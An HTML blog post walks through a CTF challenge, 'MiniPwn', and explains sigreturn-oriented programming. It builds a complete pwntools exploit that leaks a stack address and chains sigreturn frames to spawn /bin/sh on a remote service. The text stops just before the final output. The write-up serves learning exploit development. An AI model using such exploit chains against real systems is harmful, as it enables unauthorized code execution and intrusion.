<!DOCTYPE html>
<html lang="en-us">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta content="security, vulnhub, red team, hackthebox, blue team" name="keywords">
<meta content="Alex Flores" name="author">
<meta property="og:title" content="Abusing Signals with SIGROP Exploits - SecBlog">
<meta property="og:url" content="https://sec.alexflor.es/post/minipwn/">
<meta property="og:description" content="Things have been OK for me except that I&#39;m a zombie now">
<meta property="og:type" content="website" />
<title>Abusing Signals with SIGROP Exploits | SecBlog</title>

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>
<link rel="stylesheet" href="https://sec.alexflor.es/css/style.css">
<link rel="shortcut icon" href="https://sec.alexflor.es/wave.ico">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/atom-one-dark.min.css">

</head>

<body>
<section class="section">
  <div class="container">
    <nav class="nav">
      <div class="nav-left">
        <a class="nav-item" href="https://sec.alexflor.es"><h1 class="title is-4">SecBlog</h1></a>
      </div>
      <div class="nav-right">
        <nav class="nav-item level is-mobile">
          
          <a class="level-item" href="/categories/boot2root" target="_blank">
            <span class="icon">
              <i class="fa fa-terminal"></i>
            </span>
          </a>
          
          <a class="level-item" href="https://github.com/audibleblink" target="_blank">
            <span class="icon">
              <i class="fa fa-github"></i>
            </span>
          </a>
          
          <a class="level-item" href="https://twitter.com/4lex" target="_blank">
            <span class="icon">
              <i class="fa fa-twitter"></i>
            </span>
          </a>
          
          <a class="level-item" href="https://linkedin.com/in/alex2" target="_blank">
            <span class="icon">
              <i class="fa fa-linkedin-square"></i>
            </span>
          </a>
          
          <a class="level-item" href="/index.xml" target="_blank">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>
          </a>
          
        </nav>
      </div>
    </nav>
  </div>
</section>

<section class="section">
  <div class="container">
    <h1 class="title">Abusing Signals with SIGROP Exploits</h1>
    <h2 class="subtitle is-5">December 28, 2019 by Alex Flores</h2>
    
    <div class="content">
      <p><img src="1.png" alt=""></p>
<h1 id="tmhc-minipwn-walkthrough">TMHC: MiniPwn Walk-through</h1>
<p>This one's just as much for me as it is for you. They say you don't truly understand something until
you're able to teach it to someone else. So here we go!</p>
<p>The Many Hats Club had a CTF on HackTheBox a few weekends ago that re-ignited a previous passion for
exploit development. The reason it got me interested was that it required a new exploit technique
of which I'd not yet heard, Signal Return Oriented Programming. Check out
<a href="https://pdfs.semanticscholar.org/5c48/3c22bf9a761d6b900b6acdbad72b321f39ee.pdf">this whitepaper</a></p>
<h2 id="whats-sropsigrop">What's SROP/SIGROP?</h2>
<p>Basically, if you can control the Accumulator Register (AX) and reach a SYSCALL instruction,
you can send a SIGRET signal to the process. You can read more about
<a href="http://man7.org/linux/man-pages/man7/signal.7.html">Signals here.</a>
When a process receives a SIGRET signal, it takes the current stack frame and writes it to the
registers. If you're controlling the stack, then you can ostensibly create your own set of registers
in a manner that places you in a more advantageous position during your exploit.</p>
<h2 id="the-challenge">The Challenge</h2>
<p>The challenge was a very small binary, hand written in assembly. The stack was not executable (NX),
and even if you had gadgets, there's nowhere all that useful to jump.</p>
<p>Here's the <code>strace</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ strace ./pwn
execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./pwn&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;./pwn&#34;</span><span style="color:#f92672">]</span>, 0x7ffcfe4a4a50 /* <span style="color:#ae81ff">57</span> vars */<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
read<span style="color:#f92672">(</span>0, AAAAAAA
<span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 300<span style="color:#f92672">)</span>               <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
write<span style="color:#f92672">(</span>1, <span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 8AAAAAAA
<span style="color:#f92672">)</span>                <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                 <span style="color:#f92672">=</span> ?
</code></pre></div><p>So it just echos back what we type at it.</p>
<p>Here's the complete assembly (with comments by me):</p>
<pre><code class="language-x86asm" data-lang="x86asm">
_start:           ; 0x400000
push   0x40101e   ; push _write
mov    edi,0x0    ; 1st arg to the upcoming syscall. read from FD 0, STDIN
mov    rsi,rsp    ; copy stack pointer to RSI, the 2nd argument for the upcoming syscall
sub    rsi,0x8    ; subtract 0x8 from where the stack starts; the buffer will be 8 bytes
mov    edx,0x12c  ; use 300 as the 3rd argument to the upcoming read syscall, count
mov    eax,0x0    ; set the first argument to 0, which is sys_READ
syscall           ; get user input; IMPORTANT: return value (input length) goes to RAX
ret                                                                                               
                                                                                                  
_write:           ; 0x40101e
push   0x40103c   ; push _exit
mov    rsi,rsp    ; 2nd arg, buffer location
sub    rsi,0x8    ; move back 8 bytes
mov    edx,0x8    ; how much data to write, 8 bytes
mov    eax,0x1    ; which syscall to run; 1 = sys_WRITE
mov    edi,0x1    ; which descriptor to write to; 1 = STDOUT
syscall           ; write buffer to stdout
ret                                                                                               
                                                                                                  
_exit:            ; 0x40103c
mov    eax,0x3c   ; 60; exit syscall
syscall           ; exit
</code></pre><p>That's it.</p>
<p>So let's get into an overview of what our solution is going to entail. The first thing to know is
that our buffer is 8 bytes. We can determine that by either looking at the assembly or with the
traditional pattern create/query. We'll also need know the binary's security measures. The remote
box has ASLR enabled, which we would have found later; we'll proceed with that as a given.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</code></pre></div><p>We can take two paths from here. We can SIGROP an mprotect syscall to re-enable execution on the
stack. Doing so would enable execution of shellcode from the stack again, defeating NX. Or we can
SIGROP to the execve syscall and spawn <code>/bin/sh</code>. Mprotect is the easier path, and is the intended
solution. It wasn't the path I initially took.</p>
<p>Being the glutton for punishment that I am, let's continue with the execve syscall route.</p>
<p>The return value from <code>SYS_read</code> is the size of bytes read and is stored at <code>RAX</code>. <code>RAX</code> also
happens to be where the <code>syscall</code> instruction looks to see which syscall function it should be
running. <code>SYS_sigreturn</code> is syscall 15 according to
<a href="https://filippo.io/linux-syscall-table/">this handy syscall table.</a></p>
<p>Here's our plan:</p>
<ol>
<li>Overwrite the stack and force an address leak.
<ul>
<li>Calculate some consistent known offset since ASLR is on.</li>
</ul>
</li>
<li>Restart the program without quitting, setting it back to a vulnerable state</li>
<li>Overwrite again, this time setting up a read <code>SYS_sigreturn</code>
<ul>
<li>Since we can hand-write the stack frame that ends up in the registers, we'll set <code>$RSP</code> to our
known offset. Additionally, we'll set up a <code>SYS_read</code> in the frame so we can continue sending the
binary some more data.</li>
</ul>
</li>
<li>Set up  our buffer for more control flow and add another SIGRET frame, this time for <code>SYS_execve</code></li>
<li>Trigger the SIGRET by sending 15 bytes</li>
<li>Maybe shell</li>
</ol>
<h2 id="the-exploit">The Exploit</h2>
<p>I took the opportunity, as a supplemental exercise, to also get very familiar with the <code>pwntools</code>
exploit-writing library for Python. I'll be trying to use as few &lsquo;magic&rsquo; numbers as possible and
use the library to its fullest potential.</p>
<p>This is the skeleton I'm going to start with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys

BIN <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./pwn</span><span style="color:#e6db74">&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_pipe</span>(gdb_commands):
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]</span><span style="color:#e6db74">&#34;</span>)

    context<span style="color:#f92672">.</span>clear(
        arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>,
        terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#34;</span>]
    )

    opt <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">if</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span>:
        context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span>,
        io <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug(BIN, gdb_commands)
    <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">remote</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
        HOST, PORT <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
        io <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">local</span><span style="color:#e6db74">&#34;</span>:
        io <span style="color:#f92672">=</span> process(BIN)
    <span style="color:#66d9ef">else</span>:
        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]</span><span style="color:#e6db74">&#34;</span>)

    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Run mode: {}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(opt))
    <span style="color:#66d9ef">return</span> io

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#34;</span>:

    commands <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    b _start</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
    elf, rop <span style="color:#f92672">=</span> ELF(BIN), ROP(BIN)
    io  <span style="color:#f92672">=</span> setup_pipe(commands)

    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    EXPLOIT CODE GOES HERE</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>We can start by declaring some constants that we'll need for the exploit. Let's get some info first:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass _start
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _start:
   0x0000000000401000 &lt;+0&gt;:     push   0x40101e
   0x0000000000401005 &lt;+5&gt;:     mov    edi,0x0
   0x000000000040100a &lt;+10&gt;:    mov    rsi,rsp
   0x000000000040100d &lt;+13&gt;:    sub    rsi,0x8
   0x0000000000401011 &lt;+17&gt;:    mov    edx,0x12c
   0x0000000000401016 &lt;+22&gt;:    mov    eax,0x0
   0x000000000040101b &lt;+27&gt;:    syscall
   0x000000000040101d &lt;+29&gt;:    ret

pwndbg&gt; disass _write
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _write:
   0x000000000040101e &lt;+0&gt;:     push   0x40103c
   0x0000000000401023 &lt;+5&gt;:     mov    rsi,rsp
   0x0000000000401026 &lt;+8&gt;:     sub    rsi,0x8
   0x000000000040102a &lt;+12&gt;:    mov    edx,0x8
   0x000000000040102f &lt;+17&gt;:    mov    eax,0x1
   0x0000000000401034 &lt;+22&gt;:    mov    edi,0x1
   0x0000000000401039 &lt;+27&gt;:    syscall
   0x000000000040103b &lt;+29&gt;:    ret
</code></pre></div><p>From here, we generate our address constants:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall   <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">27</span> <span style="color:#75715e"># 0x401016</span>
ret2read  <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">22</span> <span style="color:#75715e"># 0x401016</span>
ret2write <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_write <span style="color:#f92672">+</span> <span style="color:#ae81ff">17</span> <span style="color:#75715e"># 0x40102f</span>
_start    <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>  <span style="color:#75715e"># we want to skip pushing _write to the stack</span>

OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
SIGRET_FRAME_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">248</span>
SLEEP <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</code></pre></div><p>Building our first overwrite of the stack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Overflow the next two return addresses:</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">First, ret to (mov eax,0x1) to cause a write syscall. Doing this</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">makes execution skip the part of _write that sets the output length</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">to just 8. This makes it print the 0x12c bytes set at 401011,</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">causing pointer leaks</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Next, ret to _start+5 to skip pushing _write at 0x401000. This also</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">sets up the binary to begin listening again with an 8 byte buffer,</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">putting it back into an overflowable/vulnerable state.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Sending initial payload to leak pointers</span><span style="color:#e6db74">&#34;</span>)
data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> OFFSET
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(ret2write) <span style="color:#75715e"># Leak pointers</span>
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(_start)    <span style="color:#75715e"># Reset</span>
p<span style="color:#f92672">.</span>send(data)
</code></pre></div><p>Now we deal with the data that we've forced the application to echo back to us:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">The 4th giant-word is an environment variable pointer.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&amp;</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> it with 0xfffffffffffff000 to find the beginning of the page.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">This is our new, known base/offset that remains consistent between</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">runs, even with ASLR</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
leaks <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
pointer <span style="color:#f92672">=</span> leaks[<span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
stack_leak <span style="color:#f92672">=</span> u64(pointer) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
log<span style="color:#f92672">.</span>warn(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">leaked stack: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(stack_leak))
</code></pre></div><p>We can create a function that will generate us our SIGRET frame to keep the code a little cleaner:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Build a SIGRETURN SYS_read frame that reads 2000 bytes.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sigreturn_read</span>(read_location):
    frame <span style="color:#f92672">=</span> SigreturnFrame()
    frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_read
    frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>STDIN_FILENO
    frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> read_location
    frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>
    frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> read_location
    frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
    <span style="color:#66d9ef">return</span> bytes(frame)

<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Overflow again thanks to the SYS_read we setup from the 1st payload</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">First, reset binary to into a read state.  To this read, we will</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">soon pass 15 bytes to manipulate RAX (read return value of # bytes read)</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Next, ret to a syscall to trigger the SIGRETURN</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Also, send the SIGRETURN Frame </span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Sending stage 2 which seeds the first SIGRETURN frame</span><span style="color:#e6db74">&#34;</span>)
pause(SLEEP)
data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> OFFSET
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(ret2read)
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(syscall)
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> sigreturn_read(stack_leak)
p<span style="color:#f92672">.</span>send(data)
</code></pre></div><p>Now we trigger the SIGRET by sending 15 bytes (remember the SIGRET number is 15 and the return
value of <code>SYS_read</code> is the number of bytes read, and this return value gets stored in RAX)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Trigger SIGRETURN by sending 15 bytes to the binary when it</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">reading, which sets RAX to 15. When execution meets a syscall</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">instruction, the frame above will replace all the register values</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Triggering the first SIGRETURN by sending 15 junk bytes</span><span style="color:#e6db74">&#34;</span>)
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
</code></pre></div><p>The SIGRET frame we built earlier has now been pulled into the registers.</p>
<pre><code>rax = 0 # SYS_read
rdi = 0 # STDIN File Descriptor
rsi = our calculated page-start address
rdx = 2000 # arg to sys_READ for how many bytes to read
rsp = our calculated page-start address
rip = our syscall address
</code></pre><p>Execution continues to a <code>syscall</code> instruction, because that's where we set RIP in our frame. Given
our now known stack-base, we can now build out our own stack and track our own offsets. We'll set
up another SYS_read which will read 15 bytes to set RAX and then ret to a syscall to trigger the
SIGRETURN. We can calculate where the end of the payload (previous 2 instruction plus our custom
stack frame) will be. Once triggered, <code>/bin/sh</code> will be at RSP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Build a SYS_execve SIGRETURN frame that will execute /bin/sh</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">The binsh address in the stack will eventually hold </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">followed by a pointer to null, followed by a pointer to binsh</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">pointer, in order to satisfy execve</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s second argument, and array</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">of args, hence the +16</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">execve(*program, *args{program, null}, null)</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sigreturn_execve</span>(binsh_addr):
    frame <span style="color:#f92672">=</span> SigreturnFrame()
    frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve
    frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> binsh_addr
    frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> binsh_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>
    frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
    <span style="color:#66d9ef">return</span> frame


binsh <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>

payload  <span style="color:#f92672">=</span> p64(ret2read)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(syscall)

end_of_payload <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">+</span> len(payload) <span style="color:#f92672">+</span> SIGRET_FRAME_SIZE <span style="color:#f92672">+</span> len(binsh)

frame <span style="color:#f92672">=</span> sigreturn_execve(end_of_payload)
frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> end_of_payload
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> bytes(frame)
<span style="color:#75715e"># ^ &#39;end_of_payload&#39;</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> binsh
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(end_of_payload)

<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Reset to vuln state</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload</span><span style="color:#e6db74">&#34;</span>)
p<span style="color:#f92672">.</span>send(p64(ret2read))
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> OFFSET <span style="color:#f92672">+</span> payload)

<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Send 15 bytes to trigger SIGRETURN again, executing /bin/sh</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Triggering the last SIGRETURN</span><span style="color:#e6db74">&#34;</span>)
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">C</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
p<span style="color:#f92672">.</span>interactive()

</code></pre></div><p>That should be all we need. When we run our final payload, we get:</p>
